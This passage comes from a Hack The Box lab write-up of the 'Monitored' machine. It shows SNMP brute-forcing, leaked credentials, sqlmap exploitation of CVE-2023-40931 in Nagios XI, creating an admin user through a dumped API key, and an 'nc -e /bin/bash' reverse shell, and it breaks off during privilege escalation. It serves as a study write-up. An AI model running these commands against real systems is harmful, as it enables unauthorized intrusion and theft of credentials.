,https://cruxqsec.github.io/writeups/htb-monitored/img/8.png 726w" sizes=100vw></picture></figure></p><p>For the <code>open|filtered</code> ports <kbd><code>nmap</code></kbd> can&rsquo;t detect wether they are open or close.</p><p>We have <a href=https://en.wikipedia.org/wiki/Network_Time_Protocol target=_blank rel=noreferrer>NTP</a> on port 123 which can&rsquo;t really be used.<br>We have <a href=https://en.wikipedia.org/wiki/Simple_Network_Management_Protocol target=_blank rel=noreferrer>SNMP</a> which could lead to something interesting.</p><h3 id=snmp class="relative group">SNMP <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#snmp aria-label=Anchor>#</a></span></h3><p>So I ran</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>sudo nmap -sU -sC -sV -p <span class=m>161</span> 10.10.11.248
</span></span></code></pre></div><div class="flex rounded-md bg-primary-100 px-4 py-3 dark:bg-primary-900"><span class="pe-3 text-primary-400"><span class="icon relative inline-block px-1 align-text-bottom"><svg viewBox="0 0 512 512"><path fill="currentColor" d="M506.3 417 293 53c-16.33-28-57.54-28-73.98.0l-213.2 364C-10.59 444.9 9.849 480 42.74 480h426.6c32.76.0 53.26-35 36.96-63zM232 168c0-13.25 10.75-24 24-24s24 10.8 24 24v128c0 13.25-10.75 24-23.1 24S232 309.3 232 296V168zm24 248c-17.36.0-31.44-14.08-31.44-31.44s14.07-31.44 31.44-31.44 31.44 14.08 31.44 31.44C287.4 401.9 273.4 416 256 416z"/></svg>
</span></span><span class=dark:text-neutral-300><strong>Note:</strong> We have to use <code>sudo</code> because doing UDP scans required admin rights.</span></div><p>to enumerate it even further. We get the following:</p><p><figure><picture class="mx-auto my-0 rounded-md"><source srcset="https://cruxqsec.github.io/writeups/htb-monitored/img/9_hu_19a25d77bc6ad4c1.webp 330w,https://cruxqsec.github.io/writeups/htb-monitored/img/9_hu_a3850149cae37ab3.webp 660w
,https://cruxqsec.github.io/writeups/htb-monitored/img/9_hu_9063d347732054f0.webp 779w
,https://cruxqsec.github.io/writeups/htb-monitored/img/9_hu_9063d347732054f0.webp 779w" sizes=100vw type=image/webp><img width=779 height=656 class="mx-auto my-0 rounded-md" alt="image 9" loading=lazy decoding=async src=https://cruxqsec.github.io/writeups/htb-monitored/img/9_hu_4eb26f485e4f0f5d.png srcset="https://cruxqsec.github.io/writeups/htb-monitored/img/9_hu_cfd6e85ec3e31795.png 330w,https://cruxqsec.github.io/writeups/htb-monitored/img/9_hu_4eb26f485e4f0f5d.png 660w
,https://cruxqsec.github.io/writeups/htb-monitored/img/9.png 779w
,https://cruxqsec.github.io/writeups/htb-monitored/img/9.png 779w" sizes=100vw></picture></figure></p><p>Here we have a bun of processes and some basic info.</p><p><figure><picture class="mx-auto my-0 rounded-md"><source srcset="https://cruxqsec.github.io/writeups/htb-monitored/img/10_hu_819a552e82c0fecd.webp 330w,https://cruxqsec.github.io/writeups/htb-monitored/img/10_hu_c96d648b652d87f5.webp 660w
,https://cruxqsec.github.io/writeups/htb-monitored/img/10_hu_1e318cf594cd05e3.webp 991w
,https://cruxqsec.github.io/writeups/htb-monitored/img/10_hu_1e318cf594cd05e3.webp 991w" sizes=100vw type=image/webp><img width=991 height=819 class="mx-auto my-0 rounded-md" alt="image 10" loading=lazy decoding=async src=https://cruxqsec.github.io/writeups/htb-monitored/img/10_hu_8a005b35335caa8b.png srcset="https://cruxqsec.github.io/writeups/htb-monitored/img/10_hu_7315d14b7d3529ed.png 330w,https://cruxqsec.github.io/writeups/htb-monitored/img/10_hu_8a005b35335caa8b.png 660w
,https://cruxqsec.github.io/writeups/htb-monitored/img/10.png 991w
,https://cruxqsec.github.io/writeups/htb-monitored/img/10.png 991w" sizes=100vw></picture></figure></p><p>Here we can see the services listening and the open ports.
So I proceed to scan the port 162 with the same <kbd><code>nmap</code></kbd> parameters:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>sudo nmap -sU -sV -sC -p <span class=m>162</span> 10.10.11.248
</span></span></code></pre></div><p><figure><picture class="mx-auto my-0 rounded-md"><source srcset="https://cruxqsec.github.io/writeups/htb-monitored/img/11_hu_3848defd731c4578.webp 330w,https://cruxqsec.github.io/writeups/htb-monitored/img/11_hu_f98f4c6ffb36e472.webp 660w
,https://cruxqsec.github.io/writeups/htb-monitored/img/11_hu_be2514455974fdfb.webp 948w
,https://cruxqsec.github.io/writeups/htb-monitored/img/11_hu_be2514455974fdfb.webp 948w" sizes=100vw type=image/webp><img width=948 height=378 class="mx-auto my-0 rounded-md" alt="image 11" loading=lazy decoding=async src=https://cruxqsec.github.io/writeups/htb-monitored/img/11_hu_39076c8508b0e013.png srcset="https://cruxqsec.github.io/writeups/htb-monitored/img/11_hu_47e3ec4d01ce0271.png 330w,https://cruxqsec.github.io/writeups/htb-monitored/img/11_hu_39076c8508b0e013.png 660w
,https://cruxqsec.github.io/writeups/htb-monitored/img/11.png 948w
,https://cruxqsec.github.io/writeups/htb-monitored/img/11.png 948w" sizes=100vw></picture></figure></p><p>Nothing interesting here.
So after that I proceeded to try to <a href=https://book.hacktricks.wiki/en/generic-hacking/brute-force.html#snmp target=_blank rel=noreferrer>brute force the community string</a>
as we can see from the above output of the first <code>nmap</code> scan that <code>SNMPv3 Server</code> is being used. I used <kbd><code>hydra</code></kbd> :</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>hydra -P /opt/SecLists/Discovery/SNMP/common-snmp-community-strings.txt monitored.htb snmp
</span></span></code></pre></div><p><figure><picture class="mx-auto my-0 rounded-md"><source srcset="https://cruxqsec.github.io/writeups/htb-monitored/img/12_hu_3086d01af0c0c4a9.webp 330w,https://cruxqsec.github.io/writeups/htb-monitored/img/12_hu_b38fa26d8a5ddc1e.webp 660w
,https://cruxqsec.github.io/writeups/htb-monitored/img/12_hu_c9cddc36e2ac6d16.webp 1024w
,https://cruxqsec.github.io/writeups/htb-monitored/img/12_hu_2a7045436a62cc0c.webp 1109w" sizes=100vw type=image/webp><img width=1109 height=214 class="mx-auto my-0 rounded-md" alt="image 12" loading=lazy decoding=async src=https://cruxqsec.github.io/writeups/htb-monitored/img/12_hu_e914d885f25d617b.png srcset="https://cruxqsec.github.io/writeups/htb-monitored/img/12_hu_7ee03117b5574475.png 330w,https://cruxqsec.github.io/writeups/htb-monitored/img/12_hu_e914d885f25d617b.png 660w
,https://cruxqsec.github.io/writeups/htb-monitored/img/12_hu_3d81e993effb02f.png 1024w
,https://cruxqsec.github.io/writeups/htb-monitored/img/12.png 1109w" sizes=100vw></picture></figure></p><p>I found the default one being used immediately.</p><p>After that I ran <kbd><code>snmpwalk</code></kbd> and <kbd><code>snmpbulkwalk</code></kbd> (they produce similar results) to enumerate the <a href=https://en.wikipedia.org/wiki/Management_information_base target=_blank rel=noreferrer>MIB</a>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>snmpwalk -v2c -c public 10.10.11.248 &gt; snmpwalk-result
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>snmpbulkwalk -c public -v2c 10.10.11.248 . &gt; snmpbulkwalk-result
</span></span></code></pre></div><p>After searching through it I found that it leaks processes.
In the processes I found something that could probably be credentials:
<kbd><code>svc:XjH7VCehowpR1xZB</code></kbd></p><p><figure><picture class="mx-auto my-0 rounded-md"><source srcset="https://cruxqsec.github.io/writeups/htb-monitored/img/13_hu_a1b551c8a695a050.webp 330w,https://cruxqsec.github.io/writeups/htb-monitored/img/13_hu_1c6fdc96ea4be0bf.webp 660w
,https://cruxqsec.github.io/writeups/htb-monitored/img/13_hu_61005d5956d50e45.webp 1024w
,https://cruxqsec.github.io/writeups/htb-monitored/img/13_hu_e94c755646838ade.webp 1320w" sizes=100vw type=image/webp><img width=1711 height=103 class="mx-auto my-0 rounded-md" alt="image 13" loading=lazy decoding=async src=https://cruxqsec.github.io/writeups/htb-monitored/img/13_hu_11476055dd09d521.png srcset="https://cruxqsec.github.io/writeups/htb-monitored/img/13_hu_31b90a94550ceb08.png 330w,https://cruxqsec.github.io/writeups/htb-monitored/img/13_hu_11476055dd09d521.png 660w
,https://cruxqsec.github.io/writeups/htb-monitored/img/13_hu_182a061bbb123e53.png 1024w
,https://cruxqsec.github.io/writeups/htb-monitored/img/13_hu_d2d6b67e511c1a37.png 1320w" sizes=100vw></picture></figure></p><p>I also found some userIds being used by <code>LDAP</code> and <code>snmpd</code> but they were standard.</p><p>I tried the credentials on all the <code>NagiosXI</code> login page, on the <code>ShellInABox</code> terminal,
on <code>SSH</code> and finally got a hit on the <code>/nagios</code> endpoint with HTTP basic authentication.</p><h2 id=entering-nagios class="relative group">Entering Nagios <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#entering-nagios aria-label=Anchor>#</a></span></h2><p>Nagios is a event monitoring system providing alerts for services, servers,
applications, etc.</p><p>First I checked to see what version is running and I found <code>Version 4.4.13 in Nagios XI</code>.
I didn&rsquo;t find anything useful related to this version.
I also didn&rsquo;t find anything useful on the <code>Nagios Core</code> website.
Maybe some possible usernames which I couldn&rsquo;t determine
if they were created by other players or the site.</p><p>So I decided to backtrack and review if I missed anything.
As I couldn&rsquo;t authenticate to any other part of the website
I searched for a way to use the credentials.
I went back to my new <kbd><code>gobuster</code></kbd> scans which I ran and found the <code>/api</code> endpoint.</p><p><figure><picture class="mx-auto my-0 rounded-md"><source srcset="https://cruxqsec.github.io/writeups/htb-monitored/img/14_hu_2fa8c8272b4ea184.webp 330w,https://cruxqsec.github.io/writeups/htb-monitored/img/14_hu_f22079088f21960a.webp 660w
,https://cruxqsec.github.io/writeups/htb-monitored/img/14_hu_4d89c7ab895a8522.webp 1024w
,https://cruxqsec.github.io/writeups/htb-monitored/img/14_hu_c99c90db81aab66c.webp 1073w" sizes=100vw type=image/webp><img width=1073 height=530 class="mx-auto my-0 rounded-md" alt="image 14" loading=lazy decoding=async src=https://cruxqsec.github.io/writeups/htb-monitored/img/14_hu_f62c0b068fc76275.png srcset="https://cruxqsec.github.io/writeups/htb-monitored/img/14_hu_e1f5a716c473215.png 330w,https://cruxqsec.github.io/writeups/htb-monitored/img/14_hu_f62c0b068fc76275.png 660w
,https://cruxqsec.github.io/writeups/htb-monitored/img/14_hu_324902a5a205fe2c.png 1024w
,https://cruxqsec.github.io/writeups/htb-monitored/img/14.png 1073w" sizes=100vw></picture></figure></p><p>I found this <code>v1</code> endpoint. I enumerated it even further.
This time I had to exclude all the results by length as they were
all returning 200 success response, they were also saying that no API key is provided
so we might need that to use this API.<br>I added <code>--exclude-length=32</code> and found this.</p><p><figure><picture class="mx-auto my-0 rounded-md"><source srcset="https://cruxqsec.github.io/writeups/htb-monitored/img/15_hu_d49f26eb8d60538b.webp 330w,https://cruxqsec.github.io/writeups/htb-monitored/img/15_hu_638e5a215000453a.webp 660w
,https://cruxqsec.github.io/writeups/htb-monitored/img/15_hu_ae67b161e1b81e45.webp 1024w
,https://cruxqsec.github.io/writeups/htb-monitored/img/15_hu_6c31ec40cf5e4ff1.webp 1268w" sizes=100vw type=image/webp><img width=1268 height=532 class="mx-auto my-0 rounded-md" alt="image 15" loading=lazy decoding=async src=https://cruxqsec.github.io/writeups/htb-monitored/img/15_hu_73994eed4208bfed.png srcset="https://cruxqsec.github.io/writeups/htb-monitored/img/15_hu_23966e6d7dbff7c3.png 330w,https://cruxqsec.github.io/writeups/htb-monitored/img/15_hu_73994eed4208bfed.png 660w
,https://cruxqsec.github.io/writeups/htb-monitored/img/15_hu_4188c927592c4c84.png 1024w
,https://cruxqsec.github.io/writeups/htb-monitored/img/15.png 1268w" sizes=100vw></picture></figure></p><p>After visiting this endpoint I found this.</p><p><figure><picture class="mx-auto my-0 rounded-md"><source srcset="https://cruxqsec.github.io/writeups/htb-monitored/img/16_hu_1ec4fc025c2f486d.webp 330w,https://cruxqsec.github.io/writeups/htb-monitored/img/16_hu_688805d982313ad3.webp 660w
,https://cruxqsec.github.io/writeups/htb-monitored/img/16_hu_1b28117ebd5bf0ae.webp 828w
,https://cruxqsec.github.io/writeups/htb-monitored/img/16_hu_1b28117ebd5bf0ae.webp 828w" sizes=100vw type=image/webp><img width=828 height=278 class="mx-auto my-0 rounded-md" alt="image 16" loading=lazy decoding=async src=https://cruxqsec.github.io/writeups/htb-monitored/img/16_hu_7d2036c583e57a35.png srcset="https://cruxqsec.github.io/writeups/htb-monitored/img/16_hu_2473a52d82798acc.png 330w,https://cruxqsec.github.io/writeups/htb-monitored/img/16_hu_7d2036c583e57a35.png 660w
,https://cruxqsec.github.io/writeups/htb-monitored/img/16.png 828w
,https://cruxqsec.github.io/writeups/htb-monitored/img/16.png 828w" sizes=100vw></picture></figure></p><p>It seems we have to send a <code>POST</code> request to authenticate.</p><p><figure><picture class="mx-auto my-0 rounded-md"><source srcset="https://cruxqsec.github.io/writeups/htb-monitored/img/17_hu_a49f834de39fee09.webp 330w,https://cruxqsec.github.io/writeups/htb-monitored/img/17_hu_a07b5bdc21e0e374.webp 660w
,https://cruxqsec.github.io/writeups/htb-monitored/img/17_hu_cdb9e43350058cab.webp 808w
,https://cruxqsec.github.io/writeups/htb-monitored/img/17_hu_cdb9e43350058cab.webp 808w" sizes=100vw type=image/webp><img width=808 height=56 class="mx-auto my-0 rounded-md" alt="image 17" loading=lazy decoding=async src=https://cruxqsec.github.io/writeups/htb-monitored/img/17_hu_cd1a91db3305c9b4.png srcset="https://cruxqsec.github.io/writeups/htb-monitored/img/17_hu_9a063b46548a6686.png 330w,https://cruxqsec.github.io/writeups/htb-monitored/img/17_hu_cd1a91db3305c9b4.png 660w
,https://cruxqsec.github.io/writeups/htb-monitored/img/17.png 808w
,https://cruxqsec.github.io/writeups/htb-monitored/img/17.png 808w" sizes=100vw></picture></figure></p><p>So we can use a username and password to authenticate. I tried the earlier credentials and got this in the response:</p><p><figure><picture class="mx-auto my-0 rounded-md"><source srcset="https://cruxqsec.github.io/writeups/htb-monitored/img/18_hu_99ce29477868997d.webp 330w,https://cruxqsec.github.io/writeups/htb-monitored/img/18_hu_7c9e5167b396698.webp 660w
,https://cruxqsec.github.io/writeups/htb-monitored/img/18_hu_4228aa7a42f217c.webp 1024w
,https://cruxqsec.github.io/writeups/htb-monitored/img/18_hu_ed7fbce4281f7933.webp 1320w" sizes=100vw type=image/webp><img width=1508 height=56 class="mx-auto my-0 rounded-md" alt="image 18" loading=lazy decoding=async src=https://cruxqsec.github.io/writeups/htb-monitored/img/18_hu_c0ff3d3cbb41a980.png srcset="https://cruxqsec.github.io/writeups/htb-monitored/img/18_hu_41c658e192381538.png 330w,https://cruxqsec.github.io/writeups/htb-monitored/img/18_hu_c0ff3d3cbb41a980.png 660w
,https://cruxqsec.github.io/writeups/htb-monitored/img/18_hu_335bb1b07e347b41.png 1024w
,https://cruxqsec.github.io/writeups/htb-monitored/img/18_hu_831fb59f9af5dad.png 1320w" sizes=100vw></picture></figure></p><p>We can see we have an <code>auth_token</code>, after I searched how I could use this token,
I found the documentation <a href=https://www.nagios.org/ncpa/help/2.2/api.html target=_blank rel=noreferrer>here</a>.
We can see we just have to add <code>?token=token-value</code> to use it.<br>I tried it on <code>/nagiosxi/index.php</code> and we&rsquo;re in.</p><p><figure><picture class="mx-auto my-0 rounded-md"><source srcset="https://cruxqsec.github.io/writeups/htb-monitored/img/19_hu_f97102c2fb28732c.webp 330w,https://cruxqsec.github.io/writeups/htb-monitored/img/19_hu_101470ae7561e6de.webp 660w
,https://cruxqsec.github.io/writeups/htb-monitored/img/19_hu_2beebcba350f3c1c.webp 1024w
,https://cruxqsec.github.io/writeups/htb-monitored/img/19_hu_5f0dae5d13083cb3.webp 1320w" sizes=100vw type=image/webp><img width=1920 height=944 class="mx-auto my-0 rounded-md" alt="image 19" loading=lazy decoding=async src=https://cruxqsec.github.io/writeups/htb-monitored/img/19_hu_e86bea491494f15c.png srcset="https://cruxqsec.github.io/writeups/htb-monitored/img/19_hu_eb6e562135763f3c.png 330w,https://cruxqsec.github.io/writeups/htb-monitored/img/19_hu_e86bea491494f15c.png 660w
,https://cruxqsec.github.io/writeups/htb-monitored/img/19_hu_c268c546de91fc93.png 1024w
,https://cruxqsec.github.io/writeups/htb-monitored/img/19_hu_d7aa888651686270.png 1320w" sizes=100vw></picture></figure></p><p>On the bottom left I highlighted the <code>Nagios XI</code> version which is <code>5.11.0</code>.
After a quick search we can see there a couple of vulnerabilities for this version as described <a href=https://outpost24.com/blog/nagios-xi-vulnerabilities/ target=_blank rel=noreferrer>here</a>.
The <code>SQLi</code> were the most interesting so I tried to exploit those.
But we can&rsquo;t access the <code>/admin</code> endpoint as we&rsquo;re not authorized to do so.</p><p>Or so I thought. How happy I was when proven wrong.<br>I tried to visit the <code>/nagiosxi/admin/banner_message-ajaxhelper.php</code> endpoint which is the one abused in the <code>CVE-2023-40931</code>.</p><p>I got a <code>200 success</code> response code and no error message saying I needed to be authenticated.</p><h3 id=exploiting-cve-2023-40931 class="relative group">Exploiting CVE-2023-40931 <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#exploiting-cve-2023-40931 aria-label=Anchor>#</a></span></h3><p>So I decided to put <code>sqlmap</code> up to the task of exploiting this CVE. So let&rsquo;s craft the command.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>sqlmap -u <span class=s2>&#34;https://nagios.monitored.htb/nagiosxi/admin/banner_message-ajaxhelper.php&#34;</span> --data<span class=o>=</span><span class=s2>&#34;action=acknowledge_banner_message&amp;id=3&#34;</span> --cookie<span class=o>=</span><span class=s2>&#34;nagiosxi=72jvrn22p6lo6n1e5e88tdsm44&#34;</span> -p id
</span></span></code></pre></div><p>So as we can see we have to specify the data that&rsquo;s being sent, which is mentioned in the site where I found the description of the CVE, we also have to use the cookie that we got from the authentication to <code>index.php</code> with the <code>token</code> value.</p><p>After that I we find that <code>id</code> is indeed injectable.</p><p>So we can append <code>-D nagiosxi -T xi_users --dump</code> to the above <code>sqlmap</code> command.</p><p><em>(I figured the database name would be <code>nagiosxi</code> and the table we get from the CVE description, we could also install <code>Nagios XI</code> to find what are is the default name for the database).</em></p><p>We get this:</p><p><figure><picture class="mx-auto my-0 rounded-md"><source srcset="https://cruxqsec.github.io/writeups/htb-monitored/img/20_hu_efd13f11f0f1b391.webp 330w,https://cruxqsec.github.io/writeups/htb-monitored/img/20_hu_b6effed5fac5623e.webp 660w
,https://cruxqsec.github.io/writeups/htb-monitored/img/20_hu_425e55622b2c4ea0.webp 1024w
,https://cruxqsec.github.io/writeups/htb-monitored/img/20_hu_1a50a6c9db5e53b3.webp 1320w" sizes=100vw type=image/webp><img width=1913 height=649 class="mx-auto my-0 rounded-md" alt="image 20" loading=lazy decoding=async src=https://cruxqsec.github.io/writeups/htb-monitored/img/20_hu_7c4cddb929337dd2.png srcset="https://cruxqsec.github.io/writeups/htb-monitored/img/20_hu_f763e501a692b87f.png 330w,https://cruxqsec.github.io/writeups/htb-monitored/img/20_hu_7c4cddb929337dd2.png 660w
,https://cruxqsec.github.io/writeups/htb-monitored/img/20_hu_294ddd9f7b772f1c.png 1024w
,https://cruxqsec.github.io/writeups/htb-monitored/img/20_hu_1feb980c6811164a.png 1320w" sizes=100vw></picture></figure></p><p>Here we have the <code>admin</code> password hash and the API key.
I tried cracking the hash with<br><kbd><code>hashcat</code></kbd> but I couldn&rsquo;t. The API key on the other hand could be useful.</p><h3 id=exploiting-the-api class="relative group">Exploiting the API <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#exploiting-the-api aria-label=Anchor>#</a></span></h3><p>So after checking the documentation I found we can navigate to<br><code>Help > API Docs > Introduction</code> in the NagiosXI page.
There we can see how to use the API key.
Then I went and downloaded the NagiosXI and use <a href=https://assets.nagios.com/downloads/nagiosxi/docs/Installing-Nagios-XI-Manually-on-Linux.pdf target=_blank rel=noreferrer>this</a> documentation to install it locally and searched for the System reference under the same <code>Help > API Docs</code> which was unavailable to me on the <code>nagios.monitored.htb</code> host because I&rsquo;m not admin.</p><p><figure><picture class="mx-auto my-0 rounded-md"><source srcset="https://cruxqsec.github.io/writeups/htb-monitored/img/21_hu_d9677cad15ed76d2.webp 330w,https://cruxqsec.github.io/writeups/htb-monitored/img/21_hu_3845cab791d66973.webp 660w
,https://cruxqsec.github.io/writeups/htb-monitored/img/21_hu_1b103f9a6dabfd29.webp 1024w
,https://cruxqsec.github.io/writeups/htb-monitored/img/21_hu_8487d5775bf69b5c.webp 1285w" sizes=100vw type=image/webp><img width=1285 height=708 class="mx-auto my-0 rounded-md" alt="image 21" loading=lazy decoding=async src=https://cruxqsec.github.io/writeups/htb-monitored/img/21_hu_d85753a666379ed7.png srcset="https://cruxqsec.github.io/writeups/htb-monitored/img/21_hu_d46ad0f1c8ef0a8b.png 330w,https://cruxqsec.github.io/writeups/htb-monitored/img/21_hu_d85753a666379ed7.png 660w
,https://cruxqsec.github.io/writeups/htb-monitored/img/21_hu_b441c3326b052928.png 1024w
,https://cruxqsec.github.io/writeups/htb-monitored/img/21.png 1285w" sizes=100vw></picture></figure></p><p>Here we see how we can add a new user. So I added it:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>curl -XPOST <span class=s2>&#34;https://nagios.monitored.htb/nagiosxi/api/v1/system/user?apikey=IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL&#34;</span> -d <span class=s2>&#34;username=azb&amp;password=azbestus&amp;name=Azbest&amp;email=azb@monitored.htb&amp;auth_level=admin&#34;</span> -k
</span></span></code></pre></div><p>So now we&rsquo;re logged in as admin. Finally!</p><p>I searched around the website for some time also reading some documentation and forums about how I could run commands which I saw was possible from the <code>NagiosCore</code> I found earlier and from the API docs.
So I found the ability to add commands under <code>Configure > Advanced Configuration > Core Config Manager > Commands</code>.</p><p><figure><picture class="mx-auto my-0 rounded-md"><source srcset="https://cruxqsec.github.io/writeups/htb-monitored/img/22_hu_4c11a8b02a9039f4.webp 330w,https://cruxqsec.github.io/writeups/htb-monitored/img/22_hu_591b40e7bbae205b.webp 660w
,https://cruxqsec.github.io/writeups/htb-monitored/img/22_hu_762ad21a665db3f6.webp 1024w
,https://cruxqsec.github.io/writeups/htb-monitored/img/22_hu_4a301bbbe16497c5.webp 1320w" sizes=100vw type=image/webp><img width=1705 height=646 class="mx-auto my-0 rounded-md" alt="image 22" loading=lazy decoding=async src=https://cruxqsec.github.io/writeups/htb-monitored/img/22_hu_5b48dd002ffe7e7a.png srcset="https://cruxqsec.github.io/writeups/htb-monitored/img/22_hu_ddfa0cb2579e01e2.png 330w,https://cruxqsec.github.io/writeups/htb-monitored/img/22_hu_5b48dd002ffe7e7a.png 660w
,https://cruxqsec.github.io/writeups/htb-monitored/img/22_hu_17b8354f9bd7f7bc.png 1024w
,https://cruxqsec.github.io/writeups/htb-monitored/img/22_hu_4800d75d374d27b.png 1320w" sizes=100vw></picture></figure></p><p>So here I added a new command that spawned a reverse shell with</p><pre tabindex=0><code>nc -e /bin/bash my-ip my port
</code></pre><p>I first tried with a bash reverse shell but it didn&rsquo;t work&mldr;<br>Then I went under <code>Monitoring > Services</code> (under the same Core Config Manager) and found services that can run commands.</p><p><figure><picture class="mx-auto my-0 rounded-md"><source srcset="https://cruxqsec.github.io/writeups/htb-monitored/img/23_hu_c83f9e43942b277.webp 330w,https://cruxqsec.github.io/writeups/htb-monitored/img/23_hu_3674c1d17563acef.webp 660w
,https://cruxqsec.github.io/writeups/htb-monitored/img/23_hu_12e994d28e16077c.webp 1024w
,https://cruxqsec.github.io/writeups/htb-monitored/img/23_hu_51775eeb42e82ff6.webp 1320w" sizes=100vw type=image/webp><img width=1707 height=613 class="mx-auto my-0 rounded-md" alt="image 23" loading=lazy decoding=async src=https://cruxqsec.github.io/writeups/htb-monitored/img/23_hu_13d850c2f42aa33c.png srcset="https://cruxqsec.github.io/writeups/htb-monitored/img/23_hu_20965ac4c7d76f88.png 330w,https://cruxqsec.github.io/writeups/htb-monitored/img/23_hu_13d850c2f42aa33c.png 660w
,https://cruxqsec.github.io/writeups/htb-monitored/img/23_hu_3e5c793160a3a23d.png 1024w
,https://cruxqsec.github.io/writeups/htb-monitored/img/23_hu_8b95ea1a30c3c328.png 1320w" sizes=100vw></picture></figure></p><p><figure><picture class="mx-auto my-0 rounded-md"><source srcset="https://cruxqsec.github.io/writeups/htb-monitored/img/24_hu_c93c6bdcd8f391ae.webp 330w,https://cruxqsec.github.io/writeups/htb-monitored/img/24_hu_ab1a977e13468b13.webp 660w
,https://cruxqsec.github.io/writeups/htb-monitored/img/24_hu_e5d97208ea188e31.webp 964w
,https://cruxqsec.github.io/writeups/htb-monitored/img/24_hu_e5d97208ea188e31.webp 964w" sizes=100vw type=image/webp><img width=964 height=693 class="mx-auto my-0 rounded-md" alt="image 24" loading=lazy decoding=async src=https://cruxqsec.github.io/writeups/htb-monitored/img/24_hu_78a4430ccd402e48.png srcset="https://cruxqsec.github.io/writeups/htb-monitored/img/24_hu_bd78d7baf2dac1c6.png 330w,https://cruxqsec.github.io/writeups/htb-monitored/img/24_hu_78a4430ccd402e48.png 660w
,https://cruxqsec.github.io/writeups/htb-monitored/img/24.png 964w
,https://cruxqsec.github.io/writeups/htb-monitored/img/24.png 964w" sizes=100vw></picture></figure></p><p>So then I ran the command and got a reverse shell. After all this pain and
RTFM moments we are finally on the box.</p><h2 id=privilege-escalation class="relative group">Privilege escalation <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#privilege-escalation aria-label=Anchor>#</a></span></h2><p>So like always I first uploaded <code>linpeas.sh</code> and ran it.
Then I checked <code>sudo -l</code> to find if we can use <code>sudo</code> anywhere. We find we can:</p><p><figure><picture class="mx-auto my-0 rounded-md"><source srcset="https://cruxqsec.github.io/writeups/htb-monitored/img/25_hu_426010a65aa73d74.webp 330w,https://cruxqsec.github.io/writeups/htb-monitored/img/25_hu_2641b9763e4c095f.webp 660w
,https://cruxqsec.github.io/writeups/htb-monitored/img/25_hu_468a2a401a7ddf12.webp 853w
,https://cruxqsec.github.io/writeups/htb-monitored/img/25_hu_468a2a401a7ddf12.webp 853w" sizes=100vw type=image/webp><img width=853 height=710 class="mx-auto my-0 rounded-md" alt="image 25" loading=lazy decoding=async src=https://cruxqsec.github.io/writeups/htb-monitored/img/25_hu_5636bdf948d6e0ac.png srcset="https://cruxqsec.github.io/writeups/htb-monitored/img/25_hu_33d2394ba50a908e.png 330w,https://cruxqsec.github.io/writeups/htb-monitored/img/25_hu_5636bdf948d6e0ac.png 660w
,https://cruxqsec.github.io/writeups/htb-monitored/img/25.png 853w
,https://cruxqsec.github.io/writeups/htb-monitored/img/25.png 853w" sizes=100vw></picture></figure></p><p>We see we can run quite a few things. We can restart services and do all kinds of stuff. So I proceeded to check out the <code>linpeas</code> output. I found this which was very interesting:</p><p><figure><picture class="mx-auto my-0 rounded-md"><source srcset="https://cruxqsec.github.io/writeups/htb-monitored/img/26_hu_51baebddd6471727.webp 330w,https://cruxqsec.github.io/writeups/htb-monitored/img/26_hu_c9e489ea333d3068.webp 660w
,https://cruxqsec.github.io/writeups/htb-monitored/img/26_hu_426d435677729688.webp 1024w
,https://cruxqsec.github.io/writeups/htb-monitored/img/26_hu_dc27d046042ad475.webp 1254w" sizes=100vw type=image/webp><img width=1254 height=257 class="mx-auto my-0 rounded-md" alt="image 26" loading=lazy decoding=async src=https://cruxqsec.github.io/writeups/htb-monitored/img/26_hu_327454a4d8531ff0.png srcset="https://cruxqsec.github.io/writeups/htb-monitored/img/26_hu_da4badb9fc90161e.png 330w,https://cruxqsec.github.io/writeups/htb-monitored/img/26_hu_327454a4d8531ff0.png 660w
,https://cruxqsec.github.io/writeups/htb-monitored/img/26_hu_902fcdfaa6290da5.png 1024w
,https://cruxqsec.github.io/writeups/htb-monitored/img/26.png 1254w" sizes=100vw></picture></figure></p><p>As we can see we can write to the <code>/usr/local/nagios/bin/</code> files which could be then restarted by the above commands that don&rsquo;t require <code>sudo</code> password.<br>I tried it with <code>npcd</code>. I deleted the binary and added a simple reverse shell script:</p><p><figure><picture class="mx-auto my-0 rounded-md"><source srcset=https://cruxqsec.github.io/writeups/htb-monitored/img/27_hu_929c2ad655bffa0b.webp sizes=100vw type=image/webp><img width=498 height=80 class="mx-auto my-0 rounded-md" alt="image 27" loading=lazy decoding=async src=https://cruxqsec.github.io/writeups/htb-monitored/img/27.png></picture></figure></p><p>After that I made it an executable with <kbd><code>chmod</code></kbd> <strong>(very important, I forgot this at first and didn&rsquo;t get the reverse shell!!!).</strong></p><p>Then I tried to restart the service with <code>sudo /etc/init.d/npcd restart</code>. But this command doesn&rsquo;t exist!?</p><p>What now?</p><p>I was stuck here a bit as this was very weird. Also I couldn&rsquo;t write to <code>/etc/init.d</code> so I couldn&rsquo;t create a new <code>npcd</code> service file&mldr;</p><p>But if we look at the <code>sudo -l</code> output again we can see we have this command that we can run:</p><div class=highlight><pre 